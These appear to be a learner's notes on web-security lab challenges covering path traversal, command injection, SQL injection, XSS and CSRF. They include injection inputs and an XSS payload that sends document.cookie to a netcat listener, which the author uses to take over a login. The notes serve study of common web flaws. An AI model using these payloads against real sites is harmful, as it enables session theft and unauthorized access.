## Path traversals:

The paths of URL's are actually like the linux directory.You
can use `..` to go back and stuff. The thing with curl is that 
it preprocccess the path, eg:
![[Pasted image 20250311120738.png]] It already has shortened the path to `/flag`. But if you write a HTTP packet yourself and send it over nc then it won't preproccess the path. eg:![[Pasted image 20250311120845.png]] Now all this is fine until the path's aren't "stripped".like: ![[Pasted image 20250312100120.png]] Over here you need to "fool" the strip function , so just fire up the python interpreter and see the functioning and all.So in this level you need to first go inside the folder and then traverse back to `/`. ## Command Injection (CMDi): developers rely on the command line shell to help with  complex operations. In these cases, a web server will execute  a Linux command and use the command's results in its operation CMDi1: ![[Pasted image 20250312103815.png]] ![[Pasted image 20250312104311.png]] This just takes in args from the URL and executes them on the shell. CMDi2: ![[Pasted image 20250312104805.png]] this can be used too when ';' is not permitted. CMDi3: You actually need to play with the program and think in a  different angle.Make a script like this and test:![[Pasted image 20250313093432.png]] CMDi4: The backtick is also a powerful command as it executes the command in between it and replaces it with it's output. But it won't be useful in our case as we don't have root perms:![[Pasted image 20250313095456.png]] So another way out of this is to use `; "cmd" #` . `;` basically  means "empty" and `#` means comment. So only  the `cmd` will be executed. ![[Pasted image 20250313095640.png]] ![[Pasted image 20250313095658.png]] CMDi5: When you can't see the output just write the desired output  to a file and then cat it later.![[Pasted image 20250313100530.png]] ![[Pasted image 20250313100538.png]] ## Authentication Bypass  A common type of vulnerability is an _Authentication Bypass_, where an attacker can bypass the typical authentication logic of an application and log in without knowing the necessary user credentials. This level challenges you to explore one such scenario. This specific scenario arises because, again, of a gap between what the developer expects (that the URL parameters set by the application will only be set by the application itself) and the reality (that attackers can craft HTTP requests to their hearts content). ## SQL injection A SQL injection, conceptually, is to SQL what a Command Injection is to the shell. In Command Injections, the application assembled a command string, and a gap between the developer's intent and the command shell's actual functionality enabled attackers to carry out actions unintended by the attacker. A SQL injection is the same: the developer builds the application to make SQL queries for certain goals, but because of the way these queries are assembled by the application logic, the resulting actions of the SQL query, when executed by the database, can be disastrous from a security perspective. It's easier to use a browser in these challenges rather than crafting packets yourself. 

SQLi 1:  It was solved by putting the password to `1 OR 1=1`. I needed to  set the username as "admin" only cuz it would be later be used to make the cookies. I couldn't use a cookie attack over here like above cuz the cookies were encrypted.So the password query didn't have any `' '` like the username field so thats why i could inject my sql into the password field. I needed to put a `1` there cuz it wanted the pin's first number to a number. So even if the pin wasn't 1 it would result to TRUE because of 1=1. 

SQLi 2:
Just like the above but over here I put the password to 
`' OR 1=1--`. `--` is a comment in SQL. baaki  reasoning is same as 
above. 

SQLi 3: 
`UNION` can be used to chain sql commands and can be used to  access other tables too. 

SQLi 4: 
Now sometimes the table name would be random, so you can view 
the `table` attribute from `sqlite_master` meta table to view the 
name of the table and then you can chain sql commands into  
that table name.

## XSS 

Semantic gaps can occur (and lead to security issues) at the 
interface of any two technologies. So far, we have seen them 
happen between:

- A web application and the file system, leading to path traversal.
- A web application and the command line shell, leading to command injection.
- A web application and the database, leading to SQL injection.
 One part of the web application story that we have not yet  looked at is the _web browser_. We will remedy that oversight  with this challenge. The class of vulnerabilities in which injections occur into  client-side web data (such as HTML) is called _Cross Site  Scripting_, or XSS for short (to avoid the name collision with  Cascading Style Sheets). Unlike the previous injections, 
where the victim was the web server itself, the victims of 
XSS are _other users of the web application_. In a typical XSS 
exploit, an attacker will cause their own code to be injected 
into (typically) the HTML produced by a web application and 
viewed by a victim user. This will then allow the attacker to 
gain some control within the victim's browser, leading to a 
number of potential downstream shenanigans.

So it's like if there is a comment box and you inject in 
something like `<script> alert(1) </script>` then who ever loads that web-
site will render that comment and will get an alert 1.

XSS1:

upon viewing the victim i notice that an input field must be 
injected in the server.![[Pasted image 20250317105939.png]]
there are already two input fields in the server so i just 
need to add one more to get the flag.
This challenge explores something called _Stored XSS_, which 
means that data that you store on the server (in this case, 
posts in a forum) will end up being shown to a victim user.

XSS2:

Same as the first except we needed to inject a js into it.

XSS3:
In the previous examples, your injection content was first 
stored in the database (as posts), and was triggered when the 
web server retrieved it from the database and sent it to the 
victim's browser. Because the data has to be stored first and 
retrieved later, this is called a _Stored_ XSS. However, the 
magic of HTTP GET requests and their URL parameters opens the 
door to another type of XSS: _Reflected_ XSS.

Reflected XSS happens when a URL parameter is rendered into a 
generated HTML page in a way that, again, allows the attacker 
to insert HTML/JavaScript/etc. To carry out such an attack, 
an attacker typically needs to trick the victim into visiting 
a very specifically-crafted URL with the right URL 
parameters. This is unlike a Stored XSS, where an attacker  
might be able to simply make a post in a vulnerable forum and  
wait for victims to stumble onto it. So basically in this i 
just needed to inject the js into the URL. 

XSS 4:  ![[Pasted image 20250318211750.png]] When the "msg" is in a textarea just open and close the tags yourself lol.

XSS 5: 
This was a tricky one ig . I still didn't understand this 
"truly". I placed a script tag in the text box and in it I 
fetched the /publish page and then when the admin logged in 
it was redirected to the publish page where all the contents
were present in the exapanded form.

XSS 6:
same as above but I just POSTed it instead of GETing it.

XSS 7:
In this I set up a server listening for connections using 
`nc -l 1337 -v` and i injected `<script>fetch("http://127.0.0.1:1337",{method:` 
`"POST",body:document.cookie});` and then i got the password and logged
in .

## CSRF
You've used XSS to inject JavaScript to cause the victim to 
make HTTP requests. But what if there is no XSS? Can you just 
"inject" the HTTP requests directly?

Shockingly, the answer is yes. The web was designed to enable 
interconnectivity across many different websites. Sites can 
embed images from other sites, link to other sites, and even 
_redirect_ to other sites. All of this flexibility represents 
some serious security risks, and there is almost nothing 
preventing a malicious website from simply directly causing a 
victim visitor to make potentially sensitive requests, such as (in our case) a `GET` request to `http://challenge.localhost/publish`!

This style of _forging_ requests _across_ sites is called _Cross 
Site Request Forgery_, or CSRF for short.

In computing, the **same-origin policy** (**SOP**) is a concept in 
the web-app application security model. Under the policy, a 
web browser permits scripts contained in a first web page to 
access data in a second web page, but only if both web pages 
have the same _origin_. An origin is defined as a combination 
of URI scheme, host name, and port number. This policy 
prevents a malicious script on one page from obtaining access 
to sensitive data on another web page through that page's 
Document Object Model (DOM)

CSRF 1: 

This is kinda hard to wrap by head around but lets go. So the
victim over here is visiting the main site(challengelocalhost)
and also visiting my site(hacker.locahost), So i first and 
foremost need to setup hacker.localhost . I did it by just
modifying the /challenge/server code , I made it redirect back
to the localhost.challenge/publish page. Ah now i get it,
the admin first logs into the challenge.localhost and then
he opens my site which gets him redirected to the /publish 
and as the browsers already had the cookies i was able to 
see the flag.

CSRF 2: 
same as above but i just had to return a POST instead of GET.
I did that by sending html code and in it there was a form
which redirected to the url in POST when a button was clicked
automattically.

CSRF 3:
This too was straight forward , I just setup a server and 
redirected the victim to the /emp...?msg=<script> alert(69)
</script> . 

CSRF 4: 
This was a level combining the aspect of XSS with CSRF. I 
setup a server which send an injection of getting the cookies
to /emp.. . I just used `fetch(document.cookie)` to get the cookies, 
the cookies would be present in the server logs. Then after 
getting the cookies I just logged in and got the flag.
